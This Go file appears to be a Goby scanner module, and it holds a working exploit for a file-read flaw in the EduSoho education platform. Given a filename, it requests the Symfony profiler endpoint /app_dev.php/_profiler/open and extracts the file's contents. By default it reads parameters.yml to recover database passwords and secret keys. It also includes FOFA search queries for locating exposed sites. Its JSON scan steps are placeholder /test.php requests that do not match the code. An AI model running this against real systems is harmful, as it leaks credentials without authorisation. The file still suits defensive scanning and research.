package exploits

import (
	"regexp"
	"strings"

	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "EduSoho education and training system open file file parameter file reading vulnerability",
    "Description": "<p>EduSoho education and training system is an open source online school system developed by Hangzhou Kuozhi Network Technology.</p><p>By sending the ?file parameter to the /app_dev.php/_profiler/open endpoint, you can read the contents of the app/config/parameters.yml file and get sensitive information such as the secret value and database account password saved in the file.</p>",
    "Product": "EduSoho-Network-Classroom",
    "Homepage": "http://www.edusoho.com/",
    "DisclosureDate": "2022-12-15",
    "PostTime": "2023-09-26",
    "Author": "hdrw1024@gmail.com",
    "FofaQuery": "body=\"Powered By EduSoho\" || body=\"www.edusoho.com\"",
    "GobyQuery": "body=\"Powered By EduSoho\" || body=\"www.edusoho.com\"",
    "Level": "2",
    "Impact": "<p>Attackers can use this vulnerability to read important system files (such as database configuration files, system configuration files), database configuration files, resulting in an extremely insecure state of the website.</p>",
    "Recommendation": "<p>There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update: <a href=\"http://www.edusoho.com/\">http://www.edusoho.com/</a></p><p>Temporary fix:</p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2. If not necessary, prohibit public network access to the system.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "filename",
            "type": "input",
            "value": "app/config/parameters.yml"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Read"
    ],
    "VulType": [
        "File Read"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.5",
    "Translation": {
        "CN": {
            "Name": "EduSoho 教培系统 open 文件 file 参数文件读取漏洞",
            "Product": "EduSoho-开源网络课堂",
            "Description": "<p>EduSoho 教培系统是由杭州阔知网络科技研发的开源网校系统。</p><p>通过向 /app_dev.php/_profiler/open 端点发送 ?file 参数可以读取到 app/config/parameters.yml 文件的内容，拿到该文件中保存的 secret 值以及数据库账号密码等敏感信息。<br></p>",
            "Recommendation": "<p>目前没有详细的解决方案提供，请关注厂商主页更新：<a href=\"http://www.edusoho.com/\">http://www.edusoho.com/</a></p><p>临时修复方案：</p><p>1、通过防火墙等安全设备设置访问策略，设置白名单访问。</p><p>2、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>攻击者可以利用该漏洞读取重要的系统文件（如数据库配置文件、系统配置文件）、数据库配置文件等，使得网站不安全。<br></p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取"
            ]
        },
        "EN": {
            "Name": "EduSoho education and training system open file file parameter file reading vulnerability",
            "Product": "EduSoho-Network-Classroom",
            "Description": "<p>EduSoho education and training system is an open source online school system developed by Hangzhou Kuozhi Network Technology.</p><p>By sending the ?file parameter to the /app_dev.php/_profiler/open endpoint, you can read the contents of the app/config/parameters.yml file and get sensitive information such as the secret value and database account password saved in the file.</p>",
            "Recommendation": "<p>There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update: <a href=\"http://www.edusoho.com/\">http://www.edusoho.com/</a></p><p>Temporary fix:</p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2. If not necessary, prohibit public network access to the system.</p>",
            "Impact": "<p>Attackers can use this vulnerability to read important system files (such as database configuration files, system configuration files), database configuration files, resulting in an extremely insecure state of the website.<br></p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10840"
}`

	sendPayload857ba5c6 := func(hostInfo *httpclient.FixUrl, filename string) (*httpclient.HttpResponse, error) {
		cfg := httpclient.NewGetRequestConfig("/app_dev.php/_profiler/open?file=" + filename)
		cfg.VerifyTls = false
		cfg.FollowRedirect = false
		return httpclient.DoHttpRequest(hostInfo, cfg)
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			rsp, _ := sendPayload857ba5c6(u, "app/config/parameters.yml")
			//优化点
			return rsp != nil && rsp.StatusCode == 200 && (strings.Contains(rsp.Utf8Html, "database_password"))
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			filename := goutils.B2S(ss.Params["filename"])
			rsp, err := sendPayload857ba5c6(expResult.HostInfo, filename)
			if err != nil {
				expResult.Success = false
				expResult.Output = err.Error()
			} else {
				if strings.Contains(rsp.Utf8Html, "cannot be opened") || strings.Contains(rsp.Utf8Html, "not readable") {
					expResult.Success = false
					expResult.Output = "目标文件不存在或权限不足"
				} else {
					expResult.Success = true
					matchResults := regexp.MustCompile(`<code>(.*?)</code>`).FindAllStringSubmatch(rsp.Utf8Html, -1)
					for _, matchResult := range matchResults {
						expResult.Output += strings.ReplaceAll(matchResult[1], `&nbsp;`, " ") + "\n"
					}
				}
			}
			return expResult
		},
	))
}
